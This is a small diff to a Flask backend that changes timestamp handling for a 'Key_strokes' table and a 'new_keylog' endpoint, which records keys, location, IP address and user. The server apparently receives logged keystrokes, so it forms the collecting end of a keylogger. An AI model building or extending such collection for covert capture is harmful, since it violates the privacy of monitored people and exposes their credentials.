@@ -25,8 +25,8 @@ migrate.init_app(app, db)
 jwt = JWTManager(app)
 
 def get_current_time():
-    current_time = datetime.now(tz(zone='Asia/Riyadh'))
-    return current_time
+    now = datetime.now(tz(zone='Asia/Riyadh')).strftime('%d-%m-%Y, %H:%M:%S')
+    return now
 
 class Blogs(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -40,7 +40,7 @@ class Key_strokes(db.Model):
     location = db.Column(db.String(30), nullable = False)
     ip_address = db.Column(db.String(30), nullable = True)
     user = db.Column(db.String(30), nullable = True)
-    timestamp = db.Column(db.String(30), server_default = datetime.now(tz(zone='Asia/Riyadh')).strftime('%d-%m-%Y, %H:%M:%S'))
+    timestamp = db.Column(db.String(30), nullable = False)
 
 class Login(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -104,9 +104,9 @@ def new_keylog():
     location = request_data['location']
     ip_address = request_data['ip_address']
     user = request_data['user']
+    timestamp = get_current_time()
 
-
-    new_blog = Key_strokes(key = key, location = location, ip_address = ip_address, user=user)
+    new_blog = Key_strokes(key = key, location = location, ip_address = ip_address, user=user, timestamp=timestamp)
     db.session.add(new_blog)
     db.session.commit()
     return {'msg': 'success added successfully'}
